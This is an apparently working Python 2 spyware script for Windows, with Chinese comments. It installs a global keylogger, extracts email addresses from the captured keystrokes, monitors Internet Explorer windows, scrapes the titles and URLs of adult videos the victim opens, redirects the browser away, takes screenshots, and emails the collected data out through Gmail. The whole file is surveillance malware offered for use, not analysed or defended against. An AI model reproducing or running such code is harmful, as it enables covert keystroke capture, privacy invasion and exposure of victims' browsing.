# -*- coding: cp950 -*-
import urllib2,pyHook,pythoncom
from bs4 import BeautifulSoup
import urlparse
import win32com.client
import time
from function_send_email import send_gmail
import threading
import googleOCR
import keylogger
from PIL import ImageGrab
import re
from ctypes import *


send_msg = []##mail的內容

video = "" ##A片的名稱與url

to_user = []##寄信者

target_sites  = {}##偵測網站字典

target_sites["www.pornhub.com"] = \
    {"logout_url"      : None,
     "logout_form"     : None,
     "login_form_index": 0,
     "owned"           : False}

target_sites["mail.google.com"] = \
    {"logout_url"      : None,
     "logout_form"     : "1ml",
     "login_form_index": 0,
     "owned"           : False}
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'##Internet Explorer的clsid

##讓wim32com可以去偵測IE瀏覽器，並用windows儲存IE瀏覽器正瀏覽的網頁
windows = win32com.client.Dispatch(clsid)


# 子執行緒的工作函數,偵測是否有A片與user的資訊
def detect_get_AV_data():
    global to_user,send_msg     
    while True:
        time.sleep(5)##每幾秒偵測一次
        
        if len(to_user)>1 and len(send_msg)>2:##如果使用者有超過1位 以及 A片資訊有超過2件
            send_gmail(to_user,send_msg)##送出信件
            send_msg = []##清空A片資訊，節省記憶體
        

t = threading.Thread(target=detect_get_AV_data)# 建立一個子執行緒

t.start()# 執行該子執行緒

# screenshot
def screenshot():
    
    pic = ImageGrab.grab(bbox=(1118,400,1825,1070))
    pic.save('C:\picture\screenshop.jpg')
    print "[Image Saved]"

# 正規表示法
def GetEmail(filename):

    f = open(filename,'r')
    output = f.read();
    reg = re.findall(r'\b[a-zA-Z0-9_.-]+@[a-zA-Z0-9]+[\.\w-]{2,}\b',output)
    f.close()
    return reg

def Key():
    #keylogger 設定
    keylogger.kl = pyHook.HookManager()
    keylogger.kl.KeyDown = keylogger.KeyStroke
    keylogger.kl.HookKeyboard()
    pythoncom.PumpMessages()
    

    
# 主執行緒繼續執行自己的工作
if __name__=='__main__':
    t = threading.Thread(target=Key)
    t.start()
    while True:
        
        for browser in windows:##掃描主機所正開啟的瀏覽器，可能有許多網頁
        
            url = urlparse.urlparse(browser.LocationUrl)##每個網頁都給他做urlparse分析
        
            if url.hostname in target_sites:##如果有網頁是我們定義的網頁(porn.com)
                try:                                                                                     
                    if "pornhub.com" in url.hostname:##表示進入porn主頁面
                    
                        if "viewkey" in url.query:##表示進入任一影片
                        
                            page = urllib2.urlopen(browser.LocationUrl)##連結url
                        
                            bs = BeautifulSoup(page,"html.parser")##對他進行爬蟲
                            

                            ##將爬到的影片標題與url用video儲存
                            video = "title = %s,url = %s" % (str(bs.title)[7:-22],browser.LocationUrl)
                            print video

                            send_msg.append(video)##將剛剛得到的video存給send_msg
                        
                            browser.Navigate(url.hostname)##將頁面導回porn主頁面，不給你看哈哈哈
                except:
                    pass

        if (keylogger.finished) == True:
            gmail = GetEmail("output.txt")
            for mail in gmail:
                to_user.append(mail)
                keylogger.finished = False;
                            
        time.sleep(5)##每偵測一次瀏覽器就休息個5秒吧，不用那麼辛苦
